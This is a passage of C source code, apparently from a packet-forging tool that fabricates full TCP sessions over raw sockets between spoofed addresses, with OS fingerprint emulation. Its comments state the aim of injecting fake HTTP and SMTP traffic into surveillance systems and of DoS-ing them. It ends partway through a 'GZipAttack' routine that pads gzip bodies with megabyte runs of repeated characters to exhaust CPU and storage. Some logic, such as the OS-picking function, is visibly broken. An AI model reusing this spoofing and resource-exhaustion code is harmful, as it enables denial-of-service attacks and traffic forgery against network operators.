        if ((qptr = (PacketInfo *)calloc(1, sizeof(PacketInfo))) == NULL) {
            // Allocation issue.. mark completed
            aptr->completed = 1;
            return;
        }

        qptr->type = PACKET_TYPE_TCP_4;
        qptr->buf = ptr->packet;
        qptr->size = ptr->packet_size;
        // These are required for sending the packet out on the raw socket.. so lets pass it
        qptr->dest_ip = ptr->destination_ip;
        qptr->dest_port = ptr->destination_port;

        // We should decide wait times soon.  30-200milliseconds will suffice
        qptr->wait_time = 0;

        // so we dont double free.. lets just keep in the new structure..
        // again i might remove this later... but wanted some room for other upgrades
        // i dont wish to discuss yet ;)
        ptr->packet = NULL;
        ptr->packet_size = 0;

        // link FIFO into the attack structure
        L_link_ordered((LINK **)&aptr->packets, (LINK *)qptr);

        ptr = ptr->next;
    }

    return;
}


//https://tools.ietf.org/html/rfc1323
// Incomplete but within 1 day it should emulate Linux, Windows, and Mac...
// we need access to the attack structure due to the timestampp generator having a response portion from the opposide sides packets
int PacketTCP4BuildOptions(AS_attacks *aptr, PacketBuildInstructions *iptr) {
    // need to see what kind of packet by the flags....
    // then determine which options are necessaray...
    // low packet id (fromm 0 being syn connection) would require the tcp window size, etc

    // options are here static.. i need to begin to generate the timestamp because that can be used by surveillance platforms
    // to attempt to weed out fabricated connections ;) i disabled it to grab this raw array
    unsigned char options[12] = {0x02, 0x04, 0x05, 0xb4, 0x01, 0x01, 0x04, 0x02, 0x01, 0x03,0x03, 0x07};
    // this is preparing for when we have dynamic options...
    char *current_options = NULL;

    int current_options_size = 12;

    // verify that we should even generate the options.. if not return 1 (no error)
    if (!(iptr->flags & TCP_OPTIONS))
        return 1;
    /*
    if (iptr->flags & TCP_OPTIONS_TIMESTAMP) {
        current_options_size += 8;
        // generate new options.. into current_options[_size]
    }*/


    current_options = (char *)calloc(1, current_options_size);
    if (current_options == NULL) return -1;

    PtrFree(&iptr->options);

    // *** generate options using flags.. timestamp+window size
    // until we generate using flags...
    memcpy(current_options, options, 12);

    iptr->options_size = current_options_size;
    iptr->options = current_options;

    return 1;
}



/* took some packet forging stuff I found online, and modified it...
   It was better than my wireshark -> C array dumping w memcpy... trying to hack this together as quickly as possible isnt fun :)

   /*!	forgetcp.c
 * 	\Brief Generate TCP packets
 * 	\Author jve
 * 	\Date  sept. 2008
*/
// Takes build instructions from things like HTTP Session generation, and creates the final network ready
// data buffers which will flow across the Internet
int BuildSingleTCP4Packet(PacketBuildInstructions *iptr) {
    int ret = -1;
    int TCPHSIZE = 20;
    char *checkbuf = NULL;

    // this is only for ipv4 tcp
    //if (iptr->type != PACKET_TYPE_TCP_4) goto end;

    // increase the heaader by the size of the TCP options
    if (iptr->options_size) TCPHSIZE += iptr->options_size;

    // calculate full length of packet.. before we allocate memory for storage
    int final_packet_size = IPHSIZE + TCPHSIZE + iptr->data_size;

    unsigned char *final_packet = (unsigned char *)calloc(1, final_packet_size);
    struct packet *p = (struct packet *)final_packet;

    // ensure the final packet was allocated correctly
    if (final_packet == NULL) goto end;
    
    // IP header below
    p->ip.version 	= 4;
    p->ip.ihl   	= IPHSIZE >> 2;
    p->ip.tos   	= 0;    
    p->ip.frag_off 	= 0x0040;
    p->ip.protocol 	= IPPROTO_TCP;

    // Source, and destination IP addresses
    p->ip.saddr 	= iptr->source_ip;
    p->ip.daddr 	= iptr->destination_ip;

    // These two relate to dynamically changing information.. TTL=OS emulation, header identifier gets incremented..
    // and should be changed every connection that is wrote to the wire
    p->ip.id 	    = htons(iptr->header_identifier);
    p->ip.ttl 	    = iptr->ttl;

    // total length
    p->ip.tot_len   = htons(final_packet_size);
    

    // TCP header below
    // The source, and destination ports in question
    p->tcp.source   = htons(iptr->source_port);
    p->tcp.dest     = htons(iptr->destination_port);

    // The ACK/SEQ relate to variables incremented during normal communications..
    p->tcp.seq      = htonl(iptr->seq);
    p->tcp.ack_seq	= htonl(iptr->ack);

    // The TCP window relates to operating system emulation
    p->tcp.window	= htons(iptr->tcp_window_size);
    
    // syn/ack used the most
    p->tcp.syn  	= (iptr->flags & TCP_FLAG_SYN) ? 1 : 0;
    p->tcp.ack	    = (iptr->flags & TCP_FLAG_ACK) ? 1 : 0;
    p->tcp.psh  	= (iptr->flags & TCP_FLAG_PSH) ? 1 : 0;
    p->tcp.fin  	= (iptr->flags & TCP_FLAG_FIN) ? 1 : 0;
    p->tcp.rst	    = (iptr->flags & TCP_FLAG_RST) ? 1 : 0;

    
    p->tcp.check	= 0;	/*! set to 0 for later computing */
    p->tcp.urg	    = 0;    
    p->tcp.urg_ptr	= 0;
    p->tcp.doff 	= TCPHSIZE >> 2;

    // IP header checksum
    p->ip.check	    = (unsigned short)in_cksum((unsigned short *)&p->ip, IPHSIZE);

    /*
    // Lets make sure we cover all header variables.. just to be sure it wont be computationally possible
    // to filter out all packets....
    __u16 	res1:4 // supposed to be unused..
    __u16 	ece:1
    __u16 	cwr:1
    https://stackoverflow.com/questions/1480548/tcp-flags-present-in-the-header
    The two flags, 'CWR' and 'ECE' are for Explicit Congestion Notification as defined in RFC 3168.
    */

    // TCP header checksum
    if (p->tcp.check == 0) {
        struct pseudo_tcp *p_tcp = NULL;
        checkbuf = (char *)calloc(1,sizeof(struct pseudo_tcp) + TCPHSIZE + iptr->data_size);

        if (checkbuf == NULL) goto end;

        p_tcp = (struct pseudo_tcp *)checkbuf;

        p_tcp->saddr 	= p->ip.saddr;
        p_tcp->daddr 	= p->ip.daddr;
        p_tcp->mbz      = 0;
        p_tcp->ptcl 	= IPPROTO_TCP;
        p_tcp->tcpl 	= htons(TCPHSIZE + iptr->data_size);

        memcpy(&p_tcp->tcp, &p->tcp, TCPHSIZE);
        memcpy(checkbuf + sizeof(struct pseudo_tcp), iptr->options, iptr->options_size);
        memcpy(checkbuf + sizeof(struct pseudo_tcp) + iptr->options_size, iptr->data, iptr->data_size);        

        // put the checksum into the correct location inside of the header
        p->tcp.check = (unsigned short)in_cksum((unsigned short *)checkbuf, TCPHSIZE + PSEUDOTCPHSIZE + iptr->data_size + iptr->options_size);
    }

    // copy the TCP options to the final packet
    if (iptr->options_size)
        memcpy(final_packet + sizeof(struct packet), iptr->options, iptr->options_size);

    // copy the data to the final packet
    if (iptr->data_size)
        memcpy(final_packet + sizeof(struct packet) + iptr->options_size, iptr->data, iptr->data_size);
    

    // put the final packet into the build instruction structure as completed..
    iptr->packet = (char *)final_packet;
    iptr->packet_size = final_packet_size;

    ret = 1;

    end:;

    if (ret != 1) PtrFree((char **)&final_packet);

    PtrFree(&checkbuf);

    // returning 1 here will mark it as GOOD
    return ret;
}


// calculate checksum
unsigned short in_cksum(unsigned short *addr,int len) {
	register int sum = 0;
	u_short answer = 0;
	register u_short *w = addr;
	register int nleft = len;

        /*!
	* Our algorithm is simple, using a 32 bit accumulator (sum), we add
	* sequential 16 bit words to it, and at the end, fold back all the
	* carry bits from the top 16 bits into the lower 16 bits.
	*/
	while (nleft > 1)  {
		sum += *w++;
		nleft -= 2;
	}

	/*! mop up an odd byte, if necessary */
	if (nleft == 1) {
		*(u_char *)(&answer) = *(u_char *)w ;
		sum += answer;
	}

	/*! add back carry outs from top 16 bits to low 16 bits */
	sum = (sum >> 16) + (sum & 0xffff);     /*! add hi 16 to low 16 */
	sum += (sum >> 16);                     /*! add carry */
	answer = ~sum;                          /*! truncate to 16 bits */
	return(answer);
}


// creates the base structure for instruction to build a for the wire packet..
PacketBuildInstructions *BuildInstructionsNew(PacketBuildInstructions **list, uint32_t source_ip, uint32_t destination_ip, int source_port, int dst_port, int flags, int ttl) {
    PacketBuildInstructions *bptr = NULL;

    if ((bptr = (PacketBuildInstructions *)calloc(1, sizeof(PacketBuildInstructions))) == NULL) return NULL;

    bptr->source_ip = source_ip;
    bptr->source_port = source_port;

    bptr->destination_ip = destination_ip;
    bptr->destination_port = dst_port;

    bptr->flags = flags;
    bptr->ttl = ttl;

    // this relates to operating system emulation.. i'll get the variable here soon
    // ***
    // pcap uses its own allocator to be quicker (instead of the ordered below) so this wont affect it..
    bptr->tcp_window_size = 1500;

    // FIFO ordering
    L_link_ordered((LINK **)list, (LINK *)bptr);

    return bptr;
}

// allocates & copies data into a new pointer
int DataPrepare(char **data, char *ptr, int size) {
    char *buf = (char *)calloc(1, size + 1);
    if (buf == NULL) return -1;

    memcpy(buf, ptr, size);
    *data = buf;

    return 1;
}

// parameters required for emulation of operating systems
struct _operating_system_emulation_parameters {
    int id;
    int ttl;
    int window_size;
    // for later when doing mass amounts (millions) of connections, then we should get as accurate as possible
    int percentage_residential;
    int percentage_commercial;
} EmulationParameters[] = {
    { 1,    64, 5840,   15, 30    },               //Linux
    { 2,    64, 5720,   0,  1     },               //Google Linux
    { 4,    64, 65535,  3,  5     },               // FreeBSD
    { 8,    128, 65535, 40, 55    },               // XP
    { 16,   128, 8192,  45, 35    },               // Windows 7/Vista/Server 2008
    { 32,   255, 4128,  1,  5     },                // Cisco
    { 0,      0,    0,  0,  0     }
};

enum {
    OS_LINUX=4,
    OS_GOOGLE_LINUX=8,
    OS_FREEBSD=16,
    OS_XP=32,
    OS_WIN7=64,
    OS_CISCO=128,
    OS_CLIENT=OS_XP|OS_WIN7,
    OS_SERVER=OS_LINUX|OS_FREEBSD
    
};

// to do add counting logic, and percentage choices
// *** this code is terrible.. rewrite completely
void OsPick(int options, int *ttl, int *window_size) {
    int i = 0;
    int *list = NULL;
    int c = 0;
    int pick = 0;
    int a = 0;

    for (i = 0; EmulationParameters[i].id != 0; i++) {
        if (options & EmulationParameters[i].id) c++;
    }

    list = (int *)calloc(1,sizeof(int) * (c + 1));
    if (list == NULL) {
        pick = OS_XP;

        for (i = a = 0; EmulationParameters[i].id != 0; i++) {
            if (options & EmulationParameters[i].id)
                list[a] = EmulationParameters[i].id;
        }
        
        pick = list[rand()%c];
    }

    *ttl = EmulationParameters[pick].ttl;
    *window_size = EmulationParameters[pick].window_size;

    if (list != NULL) free(list);
    return;
}




// Generates instructions for fabricating a TCP connection being opened between two hosts..
int GenerateTCP4ConnectionInstructions(ConnectionProperties *cptr, PacketBuildInstructions **final_build_list) {
    PacketBuildInstructions *bptr = NULL;
    PacketBuildInstructions *build_list = NULL;
    int packet_flags = 0;
    int packet_ttl = 0;
    int ret = -1;

    // first we need to generate a connection syn packet..
    packet_flags = TCP_FLAG_SYN|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP|TCP_OPTIONS_WINDOW;
    packet_ttl = cptr->client_ttl;
    if ((bptr = BuildInstructionsNew(&build_list, cptr->client_ip, cptr->server_ip, cptr->client_port, cptr->server_port, packet_flags, packet_ttl)) == NULL) goto err;
    bptr->header_identifier = cptr->client_identifier++;
    bptr->client = 1; // so it can generate source port again later... for pushing same messages w out full reconstruction
    bptr->ack = 0;
    bptr->seq = cptr->client_seq++;  

    // then nthe server needs to respond acknowledgng it
    packet_flags = TCP_FLAG_SYN|TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP|TCP_OPTIONS_WINDOW;
    packet_ttl = cptr->server_ttl;
    if ((bptr = BuildInstructionsNew(&build_list, cptr->server_ip, cptr->client_ip, cptr->server_port, cptr->client_port, packet_flags, packet_ttl)) == NULL) goto err;
    bptr->header_identifier = cptr->server_identifier++;
    bptr->ack = cptr->client_seq;
    bptr->seq = cptr->server_seq++;

    // then the client must respond acknowledging that servers response..
    packet_flags = TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP;
    packet_ttl = cptr->client_ttl;
    if ((bptr = BuildInstructionsNew(&build_list, cptr->client_ip, cptr->server_ip, cptr->client_port, cptr->server_port, packet_flags, packet_ttl)) == NULL) goto err;
    bptr->header_identifier = cptr->client_identifier++;
    bptr->client = 1;
    bptr->ack = cptr->server_seq;
    bptr->seq = cptr->client_seq;

    L_link_ordered((LINK **)final_build_list, (LINK *)build_list);

    return 1;
    err:;
    return ret;
}




// Generates the instructions for the fabrication of TCP data transfer between two hosts
// Its general enough to be used with binary protocols, and supports client or server side to opposite

// notes from old HTTP building function: (i want to support packet loss over a large amount of sessions soon.. even if 1-5%)
// later we can emulate some packet loss in here.. its just  random()%100 < some percentage..
// with a loop resending the packet.. super simple to handle.  we can also falsify other scenarios
// involving ICMP etc.. some very nasty tricks coming.  
int GenerateTCP4SendDataInstructions(ConnectionProperties *cptr, PacketBuildInstructions **final_build_list, int from_client, char *data, int size) {
    PacketBuildInstructions *bptr = NULL;
    PacketBuildInstructions *build_list = NULL;
    int packet_flags = 0;
    int packet_size;
    char *data_ptr = data;
    int data_size = size;
    int packet_ttl = 0;
    uint32_t source_ip;
    uint32_t source_port;
    uint32_t dest_ip;
    uint32_t dest_port;
    uint32_t *src_identifier = NULL;
    uint32_t *dst_identifier = NULL;
    uint32_t *my_seq = NULL;
    uint32_t *remote_seq = NULL;

    // prepare variables depending on the side of the that the data is going from -> to
    if (from_client) {
        source_ip = cptr->client_ip;
        source_port = cptr->client_port;
        dest_ip = cptr->server_ip;
        dest_port = cptr->server_port;
        src_identifier = &cptr->client_identifier;
        dst_identifier = &cptr->server_identifier;
        my_seq = &cptr->client_seq;
        remote_seq = &cptr->server_seq;
    } else {
        source_ip = cptr->server_ip;
        source_port = cptr->server_port;
        dest_ip = cptr->client_ip;
        dest_port = cptr->client_port;
        src_identifier = &cptr->server_identifier;
        dst_identifier = &cptr->client_identifier;
        my_seq = &cptr->server_seq;
        remote_seq = &cptr->client_seq;
    }


    // now the sending side must loop until it sends all daata
    while (data_size > 0) {
        packet_size = min(data_size, from_client ? cptr->max_packet_size_client : cptr->max_packet_size_server);

        // if something wasn't handled properly.. (when i turned off OSPick().. i had to search for hours to find this =/)
        if (packet_size < 0) return -1;

        //printf("pkpt size %d data %d from cl %d max cl %d max serv %d\n", packet_size, data_size, from_client, cptr->max_packet_size_client, cptr->max_packet_size_server);
        // the client sends its request... split into packets..
        packet_flags = TCP_FLAG_PSH|TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP;
        packet_ttl = from_client ? cptr->client_ttl : cptr->server_ttl;
        if ((bptr = BuildInstructionsNew(&build_list, source_ip, dest_ip, source_port, dest_port, packet_flags, packet_ttl)) == NULL) goto err;
        if (DataPrepare(&bptr->data, data_ptr, packet_size) != 1) goto err;
        bptr->data_size = packet_size;

        bptr->header_identifier = *src_identifier;
        *src_identifier += 1;
        
        bptr->client = from_client;
        bptr->ack = *remote_seq;
        bptr->seq = *my_seq;
    
        *my_seq += packet_size;
        data_size -= packet_size;
        data_ptr += packet_size;

        // receiver sends ACK packet for this packet
        packet_flags = TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP;
        packet_ttl = from_client ? cptr->server_ttl : cptr->client_ttl;
        if ((bptr = BuildInstructionsNew(&build_list, dest_ip, source_ip, dest_port, source_port, packet_flags, packet_ttl)) == NULL) goto err;

        bptr->header_identifier = *dst_identifier;
        *dst_identifier += 1;

        bptr->ack = *my_seq;
        bptr->seq = *remote_seq;
        bptr->client = !from_client;

    }

    L_link_ordered((LINK **)final_build_list, (LINK *)build_list);


    return 1;
    err:;
    return 0;
}



// Generates fabricated packets required to disconnect a TCP session between two hosts.. starting with one side (client or server)
int GenerateTCP4CloseConnectionInstructions(ConnectionProperties *cptr, PacketBuildInstructions **final_build_list, int from_client) {
    PacketBuildInstructions *bptr = NULL;
    PacketBuildInstructions *build_list = NULL;
    int packet_flags = 0;
    int packet_size = 0;

    uint32_t source_ip;
    uint32_t source_port;
    uint32_t dest_ip;
    uint32_t dest_port;
    uint32_t *src_identifier = NULL;
    uint32_t *dst_identifier = NULL;
    uint32_t *my_seq = NULL;
    uint32_t *remote_seq = NULL;
    int packet_ttl = 0;

    // prepare variables depending on the side of the that the data is going from -> to
    if (from_client) {
        source_ip = cptr->client_ip;
        source_port = cptr->client_port;
        dest_ip = cptr->server_ip;
        dest_port = cptr->server_port;
        src_identifier = &cptr->client_identifier;
        dst_identifier = &cptr->server_identifier;
        my_seq = &cptr->client_seq;
        remote_seq = &cptr->server_seq;
    } else {
        source_ip = cptr->server_ip;
        source_port = cptr->server_port;
        dest_ip = cptr->client_ip;
        dest_port = cptr->client_port;
        src_identifier = &cptr->server_identifier;
        dst_identifier = &cptr->client_identifier;
        my_seq = &cptr->server_seq;
        remote_seq = &cptr->client_seq;
    }


    // source (client or server) sends FIN packet...
    packet_flags = TCP_FLAG_FIN|TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP;
    packet_ttl = from_client ? cptr->client_ttl : cptr->server_ttl;
    if ((bptr = BuildInstructionsNew(&build_list, source_ip, dest_ip, source_port, dest_port, packet_flags, packet_ttl)) == NULL) goto err;
    bptr->client = from_client;
    
    bptr->header_identifier =  *src_identifier;
    *src_identifier += 1;

    bptr->ack = *remote_seq;
    bptr->seq = *my_seq;
    *my_seq += 1;
    
    
    // other side needs to respond..adds its own FIN with its ACK
    packet_flags = TCP_FLAG_FIN|TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP;
    packet_ttl = from_client ? cptr->server_ttl : cptr->client_ttl;
    if ((bptr = BuildInstructionsNew(&build_list, dest_ip, source_ip, dest_port, source_port, packet_flags, packet_ttl)) == NULL) goto err;
    bptr->client = !from_client;

    bptr->header_identifier = *src_identifier;
    *src_identifier += 1;

    bptr->ack = *my_seq;
    bptr->seq = *remote_seq;
    *remote_seq += 1;
    


    // source (client or server) sends the final ACK packet...
    packet_flags = TCP_FLAG_ACK|TCP_OPTIONS|TCP_OPTIONS_TIMESTAMP;
    packet_ttl = from_client ? cptr->client_ttl : cptr->server_ttl;
    if ((bptr = BuildInstructionsNew(&build_list, source_ip, dest_ip, source_port, dest_port, packet_flags, packet_ttl)) == NULL) goto err;
    bptr->client = from_client;

    bptr->header_identifier = *src_identifier;
    *src_identifier += 1;

    bptr->ack = *remote_seq;
    bptr->seq = *my_seq;
    

    L_link_ordered((LINK **)final_build_list, (LINK *)build_list);

    return 1;
    err:;
    return 0;
}






/*
// This will fabricate an SMTP connection thus injecting any e-mail messages into mass surveillance platforms
// which are monitoring connections that the packets pass through.
int BuildSMTPsession(AS_attacks *aptr, uint32_t server_ip, uint32_t client_ip, uint32_t server_port,  char *source_email, char *destination_email, char *body, int body_size) {
    PacketBuildInstructions *bptr = NULL;
    PacketBuildInstructions *build_list = NULL;
    ConnectionProperties cptr;

    // decide OS later..
    int client_emulation = 0;
    int server_emulation = 0;

    // these are in headers.. and seems to be +1 fromm start..
    // we need to get more requests for when they begin to *attempt* to filter these out..
    // good luck with that.
    uint32_t client_identifier = rand()%0xFFFFFFFF;
    uint32_t server_identifier = rand()%0xFFFFFFFF;

    // os emulation and general statistics required here from operating systems, etc..
    //// find correct MTU, subtract headers.. calculate.
    // this is the max size of each packet while sending the bodies...
    int max_packet_size_client = 1500; 
    int max_packet_size_server = 1500; 

    int client_port = 1024 + (rand()%(65535-1024));

    uint32_t client_seq = rand()%0xFFFFFFFF;
    uint32_t server_seq = rand()%0xFFFFFFFF;


    cptr.server_ip = server_ip;
    cptr.server_port = server_port;
    cptr.client_ip = client_ip;
    cptr.client_port = client_port;
    cptr.ts = time(0);
    cptr.max_packet_size_client = max_packet_size_client;
    cptr.max_packet_size_server = max_packet_size_server;
    cptr.server_ttl = 53;
    cptr.client_ttl = 64;
    cptr.server_identifier = server_identifier;
    cptr.client_identifier = client_identifier;
    cptr.aptr = aptr;
    cptr.client_seq = client_seq;
    cptr.server_seq = server_seq;


    // generate our name
    // pick email address from
    // pick email to (and find its correct MX server
    // possibly connect to get its accurate email info but it shouldnt matter much.. they prob dont check due to too many packets
    // tcp connecct

    // open the connection...
    if (GenerateTCPConnectionInstructions(&cptr, &build_list) != 1) goto err;
    
    // ehlo
    sprintf(buf, "EHLO %s\n", remote_email_name)
    if (GenerateTCPSendDataInstructions(&cptr, &build_list, FROM_CLIENT, buf, strlen(buf)) != 1) goto err;
    // responsse
    if (GenerateTCPSendDataInstructions(&cptr, &build_list, FROM_SERVER, buf, strlen(buf)) != 1) goto err;

    // mail from:
    sprintf(buf, "MAIL FROM: %s\n", source_email);
    if (GenerateTCPSendDataInstructions(&cptr, &build_list, FROM_CLIENT, buf, strlen(buf)) != 1) goto err;
    // fake responsse
    if (GenerateTCPSendDataInstructions(&cptr, &build_list, FROM_SERVER, buf, strlen(buf)) != 1) goto err;

    // rcpt to:
    sprintf(buf, "RCPT TO: %s\n", destination_email);
    if (GenerateTCPSendDataInstructions(&cptr, &build_list, FROM_CLIENT, buf, strlen(buf)) != 1) goto err;
    // fake responsse
    if (GenerateTCPSendDataInstructions(&cptr, &build_list, FROM_SERVER, buf, strlen(buf)) != 1) goto err;

    // body
    // body or data string?
    if (GenerateTCPSendDataInstructions(&cptr, &build_list, FROM_CLIENT, buf, strlen(buf)) != 1) goto err;
    // fake responsse
    if (GenerateTCPSendDataInstructions(&cptr, &build_list, FROM_SERVER, buf, strlen(buf)) != 1) goto err;


    // done. send string to end i think maybe . or .. or exit i dont rem..
    if (GenerateTCPSendDataInstructions(&cptr, &build_list, FROM_CLIENT, buf, strlen(buf)) != 1) goto err;
    // fake responsse
    if (GenerateTCPSendDataInstructions(&cptr, &build_list, FROM_SERVER, buf, strlen(buf)) != 1) goto err;

    // end connection
    if (GenerateTCPCloseConnectionInstructions(&cptr, &build_list, 1) != 1) goto err;

    aptr->packet_build_instructions = build_list;
    // all packets done! good to go!
    return 1;
    err:;
    return -1;
}

*/



// Fabricates a fake HTTP session to inject information directly into mass surveillance platforms
// or help perform DoS attacks on their systems to disrupt their usages. This is the NEW HTTP function
// which uses the modular building routines.
int BuildHTTP4Session(AS_attacks *aptr, uint32_t server_ip, uint32_t client_ip, uint32_t server_port,  char *client_body,
        int client_size, char *server_body, int server_size) {
    PacketBuildInstructions *bptr = NULL;
    PacketBuildInstructions *build_list = NULL;
    ConnectionProperties cptr;
    HTTPExtraAttackParameters *eptr = NULL;
    int i = 0;
    int ret = -1;

    // these are in headers.. and seems to be +1 fromm start..
    // we need to get more requests for when they begin to *attempt* to filter these out..
    // good luck with that.
    uint32_t client_identifier = rand()%0xFFFFFFFF;
    uint32_t server_identifier = rand()%0xFFFFFFFF;

    // os emulation and general statistics required here from operating systems, etc..
    //// find correct MTU, subtract headers.. calculate.
    // this is the max size of each packet while sending the bodies...
    int max_packet_size_client = 1500;
    int max_packet_size_server = 1500; 

    int client_port = 1024 + (rand()%(65535-1024));

    uint32_t client_seq = rand()%0xFFFFFFFF;
    uint32_t server_seq = rand()%0xFFFFFFFF;

    // so we can change the seqs again later if we repeat this packet (w rebuilt source ports, identifiers and now seq)
    aptr->client_base_seq = client_seq;
    aptr->server_base_seq = server_seq;

    //OsPick(int options, int *ttl, int *window_size)
    //OsPick(OS_XP|OS_WIN7, &cptr.client_ttl, &cptr.max_packet_size_client);
    //OsPick(OS_LINUX,  &cptr.server_ttl, &cptr.max_packet_size_server);

    // if these are not set properly.. itll cause issues during low level packet building (TCPSend-ish api)
    cptr.client_ttl = 64;
    cptr.server_ttl = 53;
    cptr.max_packet_size_client = max_packet_size_client;
    cptr.max_packet_size_server = max_packet_size_server;


    cptr.server_ip = server_ip;
    cptr.server_port = server_port;
    cptr.client_ip = client_ip;
    cptr.client_port = client_port;
    gettimeofday(&cptr.ts, NULL);
    cptr.aptr = aptr;
    cptr.server_identifier = server_identifier;
    cptr.client_identifier = client_identifier;
    cptr.client_seq = client_seq;
    cptr.server_seq = server_seq;
    // deal with it later when code is completed..
    cptr.client_emulated_operating_system = 0;
    cptr.server_emulated_operating_system = 0;
    
    // open the connection...
    if (GenerateTCP4ConnectionInstructions(&cptr, &build_list) != 1) { ret = -2; goto err; }

    // now we must send data from client to server (http request)
    if (GenerateTCP4SendDataInstructions(&cptr, &build_list, FROM_CLIENT, client_body, client_size) != 1) { ret = -3; goto err; }
    
    // now we must send data from the server to the client (web page body)
    if (GenerateTCP4SendDataInstructions(&cptr, &build_list, FROM_SERVER, server_body, server_size) != 1) { ret = -4; goto err; }

    // now lets close the connection from client side first
    if (GenerateTCP4CloseConnectionInstructions(&cptr, &build_list, FROM_CLIENT) != 1) { ret = -5; goto err; }

    // that concludes all packets
    aptr->packet_build_instructions = build_list;

    // now lets build the low level packets for writing to the network interface
    BuildTCP4Packets(aptr);

    // all packets done! good to go!
    ret = 1;
    err:;
    return ret;
}

// for debugging to test various gzip parameters
int total_gzip_count = 0;

// Global variable holding the GZIP caching at the moment...
char *gzip_cache = NULL;
int gzip_cache_size = 0;
int gzip_cache_count = 0;
int gzip_initialized = 0;
pthread_mutex_t gzip_cache_mutex = PTHREAD_MUTEX_INITIALIZER;

void gzip_init() {
    pthread_mutexattr_t attr;

    if (!gzip_initialized) {
        gzip_initialized = 1;
        
        pthread_mutexattr_setprotocol(&attr, PTHREAD_PRIO_NONE);
        pthread_mutexattr_setprioceiling(&attr, 0); 

        pthread_mutex_init(&gzip_cache_mutex, NULL);

        
    }

    return;
}



// This function will perform a GZIP Attack on a body.  I wrote it to take a previously compressed HTTP result, decompress it,
// insert attacks, recompress it, replace the original, and to cache it for future use.  The caching will reuse the same
// packet for X times before retiring it.  
// If you consider generating thousands of connections every second, then it would be pretty tough for platforms to create
// seekers to find similar GZIP responses from packets that have different source ports/ips/ &destinations.  I wouldn't
// believe that reusing a GZIP attack for Y sessions will merrit any decent way of filtering.
// The parameters are attack size, and how many insertions.  The insertions is a rand()%"how many" operation  which would be the maximum
// amount of injections between 1 and that value.  The size will take random characters within the plain text data, mark them, and whenever
// compressing that character it would repeat those specific characters a million times.  It will create an extra megabyte of information
// at that characters location. Compression on top of all other analysis engines used to generate actual intelligence from raw internet
// data would clog those threads, CPUs, and possibly even hard drives up drastically.
int GZipAttack(AS_attacks *aptr, int *size, char **server_body) {
    int i = 0, n = 0, y = 0, q = 0, r = 0;
    char *data = NULL;
    int data_size = 0;
    char *sptr = 0, *header_end_ptr=NULL;
    int zip_size = 0;
    z_stream infstream;
    z_stream outstream;
    char *compressed = NULL;
    int compressed_size = 0;
    int compressed_in = 0;
    int compressed_out = 0;
    char *buf = NULL;
    int next_i = 0;
    char *zptr = NULL;
    char *compressed_realloc = NULL;
    int compression_max_size = 0;
    int ret = -1;
    int header_size = 0;
    HTTPExtraAttackParameters *options = (HTTPExtraAttackParameters *)aptr->extra_attack_parameters;

    // will contain 0 or 1 where  insertions go
    // this coould be a bitmask whatever.. dont care atm
    char *insertions = NULL;

    // it was taking 8-11minutes at 10%/1megabyte...
    // with only compressing 1 every 10-100 uses kept it between 2 minutes and 2min:10
    // 15 was is 2 minutes 4 seconds for 43k gzip attack injections.. each between 1-5 count of 1megabyte injections
    // the megabytes are the same character randomly in the output 1meg times
    pthread_mutex_lock(&gzip_cache_mutex);

    if (options != NULL) {
        if (gzip_cache && gzip_cache_count > 0) {
            buf = (char *)malloc(gzip_cache_size + 1);
            if (buf == NULL) {
                pthread_mutex_unlock(&gzip_cache_mutex);

                return 0;
            }
            memcpy(buf, gzip_cache, gzip_cache_size);

            gzip_cache_count--;

            // free original server body so that we can copy over this cached one fromm the previous gzi attack
            PtrFree(server_body);

            // move the pointer of our coppy for the calling function...
            *server_body = buf;
            // set proper size from cache size
            *size = gzip_cache_size;

            // keep count (for debugging, remove)
            total_gzip_count++;

            pthread_mutex_unlock(&gzip_cache_mutex);

            return 1;
        } else {
            PtrFree(&gzip_cache);
            gzip_cache_count = 0;
            gzip_cache_size = 0;
        }
    }

    //pthread_mutex_unlock(&gzip_cache_mutex);

    // first we unzip it so we can modify..
    // ill do some proper verification later.. but remember? we are supplying the body ourselves..
    // I hoppe if someone doesn't understand whats going on they dont attempt to change things...
    // but by all means ;) keep attacking.
    if (strstr((char *)*server_body, (char *)"gzip") != NULL) {
        // pointer to the end of the headers..
        sptr = strstr((char *)*server_body, (char *)"\r\n\r\n"); 
        if (sptr != NULL) {
            sptr += 4;

            // need to find out why the server responded with 180 here.. is it a size? related sommehow to gzip? or chunked? deal w it later
            sptr = strstr((char *)sptr, "\r\n");
            sptr += 2;
            // keep information on when the header ends..
            header_end_ptr = sptr;
            header_size = (int)((char *)sptr - (char *)*server_body);
            //printf("\rHeader Size: %d\t\n", header_size);

            // sptr should have the correct location now..lets get the size...
            zip_size = (int)(((*server_body) + *size) - sptr);

            // we must decompress the information first
            // being relaxed coding this.. will be more precise later.. just giving twice the space..
            data = (char *)calloc(1, zip_size * 2);
            if (data == NULL) goto end;

            // simple gzip decompression
            //https://gist.github.com/arq5x/5315739
            infstream.zalloc = Z_NULL;
            infstream.zfree = Z_NULL;
            infstream.opaque = Z_NULL;

            // how many bytes were in server body compressed
            infstream.avail_in = zip_size;
            infstream.next_in = (Bytef *)sptr;

            // max size we allocated for decompression is twice as much as the original size
            // this is acceptable for real files.. injections like our attack could obviously be more..
            infstream.avail_out = (uInt)(zip_size * 2);
            infstream.next_out = (Bytef *)data;

            // execute proper zlib functions for decompression
            inflateInit2(&infstream, 15+16);
            inflate(&infstream, Z_NO_FLUSH);
            inflateEnd(&infstream);
            
            // data contains the decompressed data now.. lets get the size..
            data_size = infstream.total_out;
        }
    }
    

    // if we had no decompressed data.. it wasnt gzip'd and then we can just use the original body
    if (data == NULL) {
        data = *server_body;
        data_size = *size;
    }

    // allocte space for a structure which will contain which locations will get an injection
    insertions = (char *)calloc(1, *size);

    // allocate space for the compressed output...
    compression_max_size = data_size * (600 * 3);
    compressed = (char *)malloc(compression_max_size + 1);

    // buffer for injecting attack
    buf = (char *)calloc(1, options->gzip_size + 1);

    // ensure both were allocated properly..
    if ((insertions == NULL) || (compressed == NULL) || (buf == NULL))
        goto end;

    // how many places will we insert? lets randomly pick how many & mark them
    i = 1 + (rand() % (options->gzip_injection_rand - 1));

